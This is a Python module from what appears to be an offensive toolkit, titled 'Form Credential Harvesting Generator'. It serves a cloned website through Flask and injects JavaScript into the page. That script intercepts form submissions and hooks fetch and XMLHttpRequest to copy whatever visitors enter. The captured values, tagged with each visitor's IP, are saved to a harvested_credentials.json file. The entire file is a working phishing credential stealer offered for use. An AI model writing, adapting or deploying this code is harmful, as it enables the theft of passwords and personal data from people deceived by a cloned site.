import os
import sys
import json
import time
import logging
import threading
from flask import Flask, render_template_string, request, send_from_directory, jsonify
from bs4 import BeautifulSoup
from core.promptui import *

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask(__name__)
TEMPLATE_DIR = ""
DATA_JSON_FILE = "harvested_credentials.json"
active_visitors = {}

# Universal Credential Harvesting Script (Supports GET, POST, AJAX, Fetch, XHR)
HARVEST_SCRIPT = """
<script>
(function() {
    function sendData(data) {
        if (!data || Object.keys(data).length === 0) return;
        
        fetch('/harvest-capture', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data),
            keepalive: true
        })
        .then(res => {
            console.log("[HARVEST] Data successfully captured and sent.");
        })
        .catch(err => console.error("[HARVEST Error]:", err));
    }

    // 1. Intercept standard form submissions (GET & POST)
    document.addEventListener("submit", function(e) {
        e.preventDefault();
        let form = e.target;
        let data = {};
        
        // Collect all inputs, selects, textareas
        form.querySelectorAll("input, select, textarea").forEach(el => {
            let key = el.name || el.id || el.getAttribute("placeholder") || "field";
            if (el.value !== undefined && el.value !== "") {
                data[key] = el.value;
            }
        });
        
        // Also capture URL search params if it's a GET form
        if (form.method && form.method.toLowerCase() === 'get') {
            let formData = new FormData(form);
            for (let [k, v] of formData.entries()) {
                data[k] = v;
            }
        }

        sendData(data);
    }, true);

    // 2. Intercept Fetch API (AJAX / JSON payloads)
    const originalFetch = window.fetch;
    window.fetch = async function(...args) {
        let [resource, config] = args;
        if (config && config.body) {
            try {
                let parsedData = JSON.parse(config.body);
                sendData(parsedData);
            } catch(e) {
                let parsedData = {};
                try {
                    new URLSearchParams(config.body).forEach((val, key) => { parsedData[key] = val; });
                    if (Object.keys(parsedData).length > 0) sendData(parsedData);
                } catch(err) {}
            }
        }
        return originalFetch.apply(this, args);
    };

    // 3. Intercept XMLHttpRequest (Legacy AJAX)
    const originalXHR = window.XMLHttpRequest;
    function customXHR() {
        let xhr = new originalXHR();
        let originalOpen = xhr.open;
        let originalSend = xhr.send;
        
        xhr.open = function(method, url) {
            this._url = url;
            return originalOpen.apply(this, arguments);
        };
        
        xhr.send = function(data) {
            if (data) {
                let parsedData = {};
                try {
                    parsedData = JSON.parse(data);
                } catch(e) {
                    try {
                        new URLSearchParams(data).forEach((val, key) => { parsedData[key] = val; });
                    } catch(err) {}
                }
                if (Object.keys(parsedData).length > 0) {
                    sendData(parsedData);
                }
            }
            return originalSend.apply(this, arguments);
        };
        return xhr;
    }
    window.XMLHttpRequest = customXHR;

    // Heartbeat to track active visitors
    setInterval(function() {
        navigator.sendBeacon('/harvest-heartbeat');
    }, 5000);
})();
</script>
"""

def load_json_data():
    if not os.path.exists(DATA_JSON_FILE):
        return []
    try:
        with open(DATA_JSON_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except:
        return []

def save_json_data(data):
    with open(DATA_JSON_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=4, ensure_ascii=False)

@app.before_request
def track_visitors():
    if request.path.startswith('/static') or request.path in ['/harvest-capture', '/harvest-heartbeat']:
        return
    ip = request.remote_addr
    if ip not in active_visitors:
        print(f"{PromptUi.result} New Visitor Connected -> {ip}")
    active_visitors[ip] = time.time()

@app.route('/harvest-heartbeat', methods=['POST'])
def visitor_heartbeat():
    ip = request.remote_addr
    active_visitors[ip] = time.time()
    return "", 204

@app.route('/')
def serve_index():
    index_path = os.path.join(TEMPLATE_DIR, 'index.html')
    if os.path.exists(index_path):
        with open(index_path, 'r', encoding='utf-8') as f:
            content = f.read()
        
        soup = BeautifulSoup(content, 'html.parser')
        # Inject harvesting script into body or header
        script_to_inject = BeautifulSoup(HARVEST_SCRIPT, 'html.parser')
        if soup.body:
            soup.body.append(script_to_inject)
        else:
            soup.append(script_to_inject)
        return str(soup)
    return "Error: index.html not found in the specified template folder.", 404

@app.route('/<path:filename>')
def serve_assets(filename):
    return send_from_directory(TEMPLATE_DIR, filename)

@app.route('/harvest-capture', methods=['POST', 'GET'])
def capture_data():
    visitor_ip = request.remote_addr
    req_data = {}

    if request.method == 'POST':
        if request.is_json:
            req_data = request.get_json()
        else:
            req_data = request.form.to_dict()
    elif request.method == 'GET':
        req_data = request.args.to_dict()

    if req_data:
        formatted_items = [f"\033[1;32m{k}: \033[1;37m{v}" for k, v in req_data.items()]
        print(f"\n{PromptUi.result} [CREDENTIAL CAPTURED] IP: {visitor_ip} | " + " | ".join(formatted_items))
        
        all_data = load_json_data()
        entry = {
            "ip": visitor_ip,
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "data": req_data
        }
        all_data.append(entry)
        save_json_data(all_data)
        
    return {"status": "success"}

class Module:
    def __init__(self):
        self.info = {
            'name': 'Form Credential Harvesting Generator',
            'description': 'Serves a local website folder (index.html, assets) and harvests any form credentials (GET, POST, AJAX).',
            'author': 'Quwais',
            'options': {
                'FOLDER': {
                    'default': 'cloned_site',
                    'required': True,
                    'desc': 'Path to folder containing index.html and website files'
                },
                'PORT': {
                    'default': '8080',
                    'required': True,
                    'desc': 'Local port to run the harvesting server'
                }
            }
        }

    def run(self, options):
        global TEMPLATE_DIR
        folder_path = options.get('FOLDER', 'cloned_site')
        TEMPLATE_DIR = os.path.abspath(folder_path)

        if not os.path.exists(os.path.join(TEMPLATE_DIR, 'index.html')):
            print(f"{PromptUi.error} index.html not found in directory: {TEMPLATE_DIR}")
            print(f"{PromptUi.info} Please make sure the folder exists and contains an index.html file.")
            return

        try:
            port = int(options.get('PORT', 8080))
        except ValueError:
            port = 8080

        if os.geteuid() != 0:
            print(f"{PromptUi.error} This module requires root access.")
            return

        print(f"{PromptUi.info} Serving folder: {TEMPLATE_DIR}")
        print(f"{PromptUi.info} Starting Credential Harvesting server on port {port}...")
        print(f"{PromptUi.result} Waiting for form interactions...\n")

        try:
            app.run(host='0.0.0.0', port=port, debug=False)
        except Exception as e:
            print(f"{PromptUi.error} Error running server: {e}")